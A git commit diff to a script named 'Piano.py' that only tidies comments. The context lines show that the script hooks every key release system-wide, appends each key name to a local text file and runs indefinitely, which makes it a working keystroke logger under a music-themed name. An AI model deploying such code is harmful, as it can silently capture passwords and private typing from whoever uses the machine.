1bffcff8ee8f9add5e6e1390c98ab698f64e1196
nsʇnɾ ʇǝɹɔǝs <92639080+SECRET-GUEST@users.noreply.github.com>
2023-03-23 03:29:33 +0100

    Update Piano.py

--- Music/PIANO/Piano.py
+++ Music/PIANO/Piano.py
@@ -2,7 +2,7 @@ import keyboard
 import time
 import os
 
-# Our function to record all keys in a texte
+#Function to record all keys in a texte
 def record_key(key):
     with open("piano_keys.txt", "a") as f:
         f.write(f"{key.name}")
@@ -11,14 +11,14 @@ def record_key(key):
 filename = "piano_keys.txt"
 file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)
 
-# If no file we create one
+#If no file we create one
 if not os.path.isfile(file_path):
     with open(file_path, "w") as f:
         pass
 
-# Every time the key are pushed we record it
+#Every time the key are pushed we record it
 keyboard.on_release(record_key)
 
-# Then we launch the logger in subprocess
+#Launch the logger in subprocess
 while True:
     time.sleep(1)
